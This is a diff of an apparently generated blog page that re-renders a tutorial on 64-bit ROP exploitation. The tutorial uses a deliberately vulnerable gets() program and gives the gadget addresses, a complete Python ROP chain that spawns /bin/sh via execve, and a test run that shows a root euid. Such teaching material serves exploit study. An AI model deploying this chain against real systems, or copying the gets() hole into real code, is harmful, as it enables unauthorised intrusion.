@@ -186,111 +186,123 @@
 
 <p>Operating System: Linux (Debian)</p>
 
-<p>#1. Vulnerable binary
-For this exemple, I will take a very simple code.</p>
-<pre><code class="cpp">#include <stdio.h>
+<h1 id="1-vulnerable-binary">1. Vulnerable binary</h1>
+<p>For this exemple, I will take a very simple code.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="c1">// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
-int main()
-{
-  char buf[64];
+  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="c1">// Never use this this function !
+</span>  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
-  gets(buf);  // Never use this this function !
-  printf("%s", buf);
-  return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-Like you can see, the vulnerability is near the gets function. As the gets function does not control the size of the input data, we will easily can pass an exploit thanks to the ROP method.
+<p>Like you can see, the vulnerability is near the gets function. As the gets function does not control the size of the input data, we will easily can pass an exploit thanks to the ROP method.</p>
 
-#2. To begin
-Our goal is to get a shell. For this, I choose to use the execve syscall.
+<h1 id="2-to-begin">2. To begin</h1>
+<p>Our goal is to get a shell. For this, I choose to use the execve syscall.</p>
 
-For remind: 
-int execve(const char *filename, char *const argv[], char *const envp[]);  RAX = 59
+<p>For remind:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
+</code></pre></div></div>
 
-So we will have:
-RDI = "/bin//sh"
+<p>So we will have:
+RDI = “/bin//sh”
 RSI = NULL
 RDX = NULL
-RAX = 59
+RAX = 59</p>
 
-#3. Payload construction
-To construct our payload, we will first need to set RSI (the filename arg of execve) to the string "/bin//sh". (double slash because of 64 bits architecture)
-We will use the @data section to store our string. To get the data section address we will use objdump:
-<pre><code class="bash">$ objdump -D a.out | grep data
+<h1 id="3-payload-construction">3. Payload construction</h1>
+<p>To construct our payload, we will first need to set RSI (the filename arg of execve) to the string “/bin//sh”. (double slash because of 64 bits architecture)
+We will use the @data section to store our string. To get the data section address we will use objdump:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> a.out | <span class="nb">grep </span>data
 ...
 Disassembly of section .data:
-00000000006b4000 <__data_start>:
+00000000006b4000 &lt;__data_start&gt;:
 ...
-&lt;/code&gt;&lt;/pre&gt;
-Ok, now we need the gadget to set RDI register.
+</code></pre></div></div>
 
-We will need the following gadget:
-pop rdi, to set RSI address point to the data section.
-pop rsi, to store tempararily the data section address. (because the binary does not contain "mov qword ptr [rdi], rax ; ret" gadget)
-pop rax, to store temporarily the string "/bin//sh".
-mov QWORD PTR [rsi], rax, to move the string to the address pointed by rsi. (the data section address)
+<p>Ok, now we need the gadget to set RDI register.</p>
 
-Thanks to ROPgadget, it's very easy to locate the gadget:
-<pre><code class="bash">$ ROPgadget --binary a.out| egrep 'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'
+<p>We will need the following gadget:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pop</span> <span class="n">rdi</span>                     <span class="c">; to set RSI address point to the data section.</span>
+<span class="k">pop</span> <span class="n">rsi</span>                     <span class="c">; to store tempararily the data section address. (because the binary does not contain "mov qword ptr [rdi], rax ; ret" gadget)</span>
+<span class="k">pop</span> <span class="n">rax</span>                     <span class="c">; to store temporarily the string "/bin//sh".</span>
+<span class="k">mov</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rsi],</span> <span class="n">rax</span>    <span class="c">; to move the string to the address pointed by rsi. (the data section address)</span>
+</code></pre></div></div>
+
+<p>Thanks to ROPgadget, it’s very easy to locate the gadget:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> a.out| egrep <span class="s1">'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'</span>
 ...
-0x000000000045f491 : mov qword ptr [rsi], rax ; ret
-0x00000000004314ad : pop rax ; ret
-0x00000000004016b7 : pop rsi ; ret
-0x000000000040159b : pop rdi ; ret
-...</code></pre>
-After multiple test, I found 72 of padding before rewrite RIP.
-So our payload will begin like this:
-<pre><code class="python">p = 'A'*72
-p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
-p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section
-p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
-p += '/bin//sh'
-p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
-p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
-p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section&lt;/pre&gt;</code>
+0x000000000045f491 : mov qword ptr <span class="o">[</span>rsi], rax <span class="p">;</span> ret
+0x00000000004314ad : pop rax <span class="p">;</span> ret
+0x00000000004016b7 : pop rsi <span class="p">;</span> ret
+0x000000000040159b : pop rdi <span class="p">;</span> ret
+...
+</code></pre></div></div>
 
-So now we just have to repeat this step for the next two arguments.
-We will have:
-<pre><code class="python">p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
-p += pack('&lt;Q', 0x0000000000000000) # set rdx to NULL
-p += pack('&lt;Q', 0x0000000000000000) # set rsi to NULL</code></pre>
-The last step is to set RAX to 59 (the number of execve syscall) and call the "syscall" instruction.
-<pre><code class="python">p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
-p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
-p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret</code></pre>
+<p>After multiple test, I found 72 of padding before rewrite RIP.
+So our payload will begin like this:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006b4000</span><span class="p">)</span> <span class="c"># adress of the data section</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin//sh'</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov qword ptr [rsi], rax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006b4000</span><span class="p">)</span> <span class="c"># adress of the data section</span>
+</code></pre></div></div>
 
-#4. Exploitation
-The whole payload:
-<pre><code class="python">#!/usr/bin/env python2
+<p>So now we just have to repeat this step for the next two arguments.
+We will have:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000432d49</span><span class="p">)</span> <span class="c"># pop rdx ; pop rsi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000000000</span><span class="p">)</span> <span class="c"># set rdx to NULL</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000000000</span><span class="p">)</span> <span class="c"># set rsi to NULL</span>
+</code></pre></div></div>
 
-from struct import pack
+<p>The last step is to set RAX to 59 (the number of execve syscall) and call the “syscall” instruction.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000000003b</span><span class="p">)</span> <span class="c"># Set rax to 59</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000454515</span><span class="p">)</span> <span class="c"># syscall ; ret</span>
+</code></pre></div></div>
 
-p = 'A'*72 # padding
+<h1 id="4-exploitation">4. Exploitation</h1>
+<p>The whole payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2</span>
 
-p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
-p += pack('&lt;Q', 0x00000000006b4000) # address of data section
-p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
-p += '/bin//sh'
-p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
 
-p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
-p += pack('&lt;Q', 0x00000000006b4000) # address of data section
-p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
-p += pack('&lt;Q', 0x0000000000000000) # set rdx to 0
-p += pack('&lt;Q', 0x0000000000000000) # set rsi to 0
-p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
-p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
-p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret
+<span class="n">p</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c"># padding</span>
 
-print p</code></pre>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006b4000</span><span class="p">)</span> <span class="c"># address of data section</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin//sh'</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov qword ptr [rsi], rax ; ret</span>
 
-Now we test:
-<pre><code class="bash">$ (python2 rop.py; cat) | ./a.out
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006b4000</span><span class="p">)</span> <span class="c"># address of data section</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000432d49</span><span class="p">)</span> <span class="c"># pop rdx ; pop rsi ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000000000</span><span class="p">)</span> <span class="c"># set rdx to 0</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000000000</span><span class="p">)</span> <span class="c"># set rsi to 0</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000000003b</span><span class="p">)</span> <span class="c"># Set rax to 59</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000454515</span><span class="p">)</span> <span class="c"># syscall ; ret</span>
+
+<span class="k">print</span> <span class="n">p</span>
+</code></pre></div></div>
+
+<p>Now we test:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>python2 rop.py<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./a.out
 id
-uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)&lt;/pre&gt;</code>
-Done.
-</pre></pre></__data_start></code></pre></stdio.h></code></pre>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Done.</p>
 
 	  </div>
 
@@ -360,7 +372,7 @@ Done.
 
 		<ul class="pager">
 		  
-		  <li class="previous"><a href="/general/setup/demo/2013/11/15/hello-world.html" title="Hello World!">&larr; Previous</a></li>
+		  <li class="previous"><a href="/general/2016/10/13/hello_world.html" title="Hello World!">&larr; Previous</a></li>
 		  
 		  
 		  <li class="next"><a href="/pwn/2017/05/14/aslr_bruteforce.html" title="ASLR Bruteforce">Next &rarr;</a></li>
